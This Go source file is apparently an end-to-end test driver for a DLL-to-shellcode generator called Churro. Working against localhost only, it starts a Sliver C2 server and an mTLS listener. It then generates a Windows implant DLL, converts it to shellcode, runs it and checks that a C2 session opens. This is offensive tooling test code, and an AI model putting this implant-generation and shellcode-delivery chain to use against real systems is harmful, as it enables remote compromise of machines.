// This driver is copied into the checked-out Sliver module before it is built.
// Its imports intentionally use Sliver's vendored dependencies rather than
// adding a Sliver dependency to the Churro generator module.
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	clientassets "github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	clienttransport "github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

type eventResult struct {
	event *clientpb.Event
	err   error
}

func main() {
	server := flag.String("server", "", "Sliver server executable")
	generator := flag.String("generator", "", "Churro DLL-to-shellcode generator executable")
	runner := flag.String("runner", "", "Windows shellcode runner executable")
	repo := flag.String("repo", "", "Sliver checkout path")
	flag.Parse()
	if *server == "" || *generator == "" || *runner == "" || *repo == "" {
		fatalf("-server, -generator, -runner, and -repo are required")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Minute)
	defer cancel()
	if err := run(ctx, *server, *generator, *runner, *repo); err != nil {
		fatalf("Sliver session E2E: %v", err)
	}
}

func run(ctx context.Context, serverPath, generatorPath, runnerPath, repoPath string) error {
	root, err := os.MkdirTemp("", "churro-sliver-e2e-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(root)
	serverRoot := filepath.Join(root, "server")
	clientRoot := filepath.Join(root, "client")
	homeRoot := filepath.Join(root, "home")
	for _, dir := range []string{serverRoot, clientRoot, homeRoot} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			return err
		}
	}
	serverEnv := append(os.Environ(),
		"HOME="+homeRoot,
		"USERPROFILE="+homeRoot,
		"SLIVER_ROOT_DIR="+serverRoot,
		"SLIVER_CLIENT_ROOT_DIR="+clientRoot,
	)
	grpcPort, err := unusedPort()
	if err != nil {
		return fmt.Errorf("choose multiplayer port: %w", err)
	}
	serverLogPath := filepath.Join(root, "server.log")
	serverLog, err := os.Create(serverLogPath)
	if err != nil {
		return err
	}
	defer serverLog.Close()
	serverCmd := exec.Command(serverPath, "daemon", "--lhost", "127.0.0.1", "--lport", fmt.Sprint(grpcPort), "--force")
	serverCmd.Dir = repoPath
	serverCmd.Env = serverEnv
	serverCmd.Stdout = serverLog
	serverCmd.Stderr = serverLog
	if err := serverCmd.Start(); err != nil {
		return fmt.Errorf("start Sliver server: %w", err)
	}
	serverDone := make(chan error, 1)
	go func() { serverDone <- serverCmd.Wait() }()
	defer stopProcess(serverCmd, serverDone)
	startupCtx, stopStartup := context.WithTimeout(ctx, 90*time.Second)
	err = waitForPort(startupCtx, grpcPort, serverDone)
	stopStartup()
	if err != nil {
		return fmt.Errorf("wait for Sliver server: %w; log: %s", err, readTail(serverLogPath))
	}

	profilePath := filepath.Join(root, "operator.cfg")
	operatorCtx, stopOperator := context.WithTimeout(ctx, 2*time.Minute)
	operatorCmd := exec.CommandContext(operatorCtx, serverPath,
		"operator", "--name", "churro-e2e-operator", "--lhost", "127.0.0.1",
		"--lport", fmt.Sprint(grpcPort), "--permissions", "all", "--save", profilePath)
	operatorCmd.Dir = repoPath
	operatorCmd.Env = serverEnv
	operatorOutput, operatorErr := operatorCmd.CombinedOutput()
	stopOperator()
	if operatorErr != nil {
		return fmt.Errorf("create operator profile: %w: %s", operatorErr, operatorOutput)
	}
	config, err := clientassets.ReadConfig(profilePath)
	if err != nil {
		return fmt.Errorf("read operator profile: %w", err)
	}
	rpc, conn, err := clienttransport.MTLSConnect(config)
	if err != nil {
		return fmt.Errorf("connect operator: %w", err)
	}
	defer clienttransport.CloseGRPCConnection(conn)
	version, err := rpc.GetVersion(ctx, &commonpb.Empty{})
	if err != nil {
		return fmt.Errorf("query Sliver version: %w", err)
	}
	fmt.Printf("Sliver server %s/%s commit=%s\n", version.OS, version.Arch, version.Commit)
	events, err := rpc.Events(ctx, &commonpb.Empty{})
	if err != nil {
		return fmt.Errorf("subscribe to Sliver events: %w", err)
	}
	eventCh := make(chan eventResult, 32)
	go func() {
		for {
			event, err := events.Recv()
			select {
			case eventCh <- eventResult{event: event, err: err}:
			case <-ctx.Done():
				return
			}
			if err != nil {
				return
			}
		}
	}()

	mtlsPort, err := unusedPort()
	if err != nil {
		return fmt.Errorf("choose mTLS port: %w", err)
	}
	job, err := rpc.StartMTLSListener(ctx, &clientpb.MTLSListenerReq{Host: "127.0.0.1", Port: uint32(mtlsPort)})
	if err != nil {
		return fmt.Errorf("start mTLS listener: %w", err)
	}
	listenerCtx, stopListener := context.WithTimeout(ctx, 30*time.Second)
	err = waitForPort(listenerCtx, mtlsPort, nil)
	stopListener()
	if err != nil {
		return fmt.Errorf("wait for mTLS listener job %d: %w", job.JobID, err)
	}
	fmt.Printf("Sliver mTLS listener job %d on 127.0.0.1:%d\n", job.JobID, mtlsPort)

	name := fmt.Sprintf("churro-e2e-%d", time.Now().UnixNano())
	generateCtx, stopGenerate := context.WithTimeout(ctx, 30*time.Minute)
	generated, err := rpc.Generate(generateCtx, &clientpb.GenerateReq{
		Name: name,
		Config: &clientpb.ImplantConfig{
			GOOS:                "windows",
			GOARCH:              "amd64",
			TemplateName:        "sliver",
			Format:              clientpb.OutputFormat_SHARED_LIB,
			IsSharedLib:         true,
			RunAtLoad:           false,
			Exports:             []string{"StartW"},
			IncludeMTLS:         true,
			C2:                  []*clientpb.ImplantC2{{URL: fmt.Sprintf("mtls://127.0.0.1:%d", mtlsPort)}},
			HTTPC2ConfigName:    consts.DefaultC2Profile,
			ConnectionStrategy:  "s",
			ReconnectInterval:   int64(time.Second),
			PollTimeout:         int64(time.Second),
			MaxConnectionErrors: 20,
			NetGoEnabled:        true,
		},
	})
	stopGenerate()
	if err != nil {
		return fmt.Errorf("generate Sliver shared library: %w; server log: %s", err, readTail(serverLogPath))
	}
	if generated.File == nil || !strings.EqualFold(filepath.Ext(generated.File.Name), ".dll") || len(generated.File.Data) == 0 {
		return fmt.Errorf("Sliver Generate returned no Windows DLL")
	}
	dllPath := filepath.Join(root, "sliver.dll")
	if err := os.WriteFile(dllPath, generated.File.Data, 0o600); err != nil {
		return err
	}
	fmt.Printf("Generated Sliver DLL name=%s bytes=%d\n", generated.ImplantName, len(generated.File.Data))
	loaderPath := filepath.Join(root, "sliver.bin")
	conversionCtx, stopConversion := context.WithTimeout(ctx, 3*time.Minute)
	conversionCmd := exec.CommandContext(conversionCtx, generatorPath,
		"-dll", dllPath, "-export", "StartW", "-out", loaderPath)
	conversionOutput, conversionErr := conversionCmd.CombinedOutput()
	stopConversion()
	if conversionErr != nil {
		return fmt.Errorf("generate Churro loader: %w: %s", conversionErr, conversionOutput)
	}
	loaderInfo, err := os.Stat(loaderPath)
	if err != nil || loaderInfo.Size() == 0 {
		return fmt.Errorf("Churro generated an empty loader: %v", err)
	}
	fmt.Printf("Churro loader bytes=%d\n", loaderInfo.Size())

	runnerLogPath := filepath.Join(root, "runner.log")
	runnerLog, err := os.Create(runnerLogPath)
	if err != nil {
		return err
	}
	defer runnerLog.Close()
	runnerCmd := exec.Command(runnerPath, "-input", loaderPath, "-timeout", "5m")
	runnerCmd.Stdout = runnerLog
	runnerCmd.Stderr = runnerLog
	if err := runnerCmd.Start(); err != nil {
		return fmt.Errorf("start shellcode runner: %w", err)
	}
	runnerDone := make(chan error, 1)
	go func() { runnerDone <- runnerCmd.Wait() }()
	defer stopProcess(runnerCmd, runnerDone)
	connectCtx, stopConnect := context.WithTimeout(ctx, 2*time.Minute)
	defer stopConnect()
	for {
		select {
		case <-connectCtx.Done():
			return fmt.Errorf("no matching session-open event: %w; runner log: %s; server log: %s",
				connectCtx.Err(), readTail(runnerLogPath), readTail(serverLogPath))
		case err := <-runnerDone:
			return fmt.Errorf("shellcode runner exited before session-open event: %v; log: %s", err, readTail(runnerLogPath))
		case received := <-eventCh:
			if received.err != nil {
				return fmt.Errorf("Sliver event stream: %w", received.err)
			}
			event := received.event
			if event.EventType == consts.JobStoppedEvent && event.Job != nil && event.Job.ID == job.JobID {
				return fmt.Errorf("mTLS listener stopped: %s", event.Err)
			}
			if event.EventType != consts.SessionOpenedEvent || event.Session == nil ||
				event.Session.Name != generated.ImplantName || event.Session.PID != int32(runnerCmd.Process.Pid) {
				continue
			}
			session := event.Session
			if session.OS != "windows" || session.Arch != "amd64" || !strings.EqualFold(session.Transport, "mtls") {
				return fmt.Errorf("matching session has wrong target or transport: %s/%s %s",
					session.OS, session.Arch, session.Transport)
			}
			sessions, err := rpc.GetSessions(connectCtx, &commonpb.Empty{})
			if err != nil {
				return fmt.Errorf("confirm connected session via GetSessions: %w", err)
			}
			for _, current := range sessions.GetSessions() {
				if current.ID == session.ID && current.Name == session.Name && current.PID == session.PID {
					fmt.Printf("PASS session-open event id=%s name=%s pid=%d transport=%s c2=%s\n",
						session.ID, session.Name, session.PID, session.Transport, session.ActiveC2)
					return nil
				}
			}
			return fmt.Errorf("session-open event %s was absent from GetSessions", session.ID)
		}
	}
}

func unusedPort() (int, error) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer listener.Close()
	return listener.Addr().(*net.TCPAddr).Port, nil
}

func waitForPort(ctx context.Context, port int, processDone <-chan error) error {
	ticker := time.NewTicker(250 * time.Millisecond)
	defer ticker.Stop()
	for {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 500*time.Millisecond)
		if err == nil {
			conn.Close()
			return nil
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case processErr := <-processDone:
			return fmt.Errorf("process exited: %v", processErr)
		case <-ticker.C:
		}
	}
}

func stopProcess(command *exec.Cmd, done <-chan error) {
	if command == nil || command.Process == nil {
		return
	}
	if command.ProcessState != nil {
		return
	}
	_ = command.Process.Kill()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
	}
}

func readTail(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return err.Error()
	}
	if len(data) > 16*1024 {
		data = data[len(data)-16*1024:]
	}
	return string(data)
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}
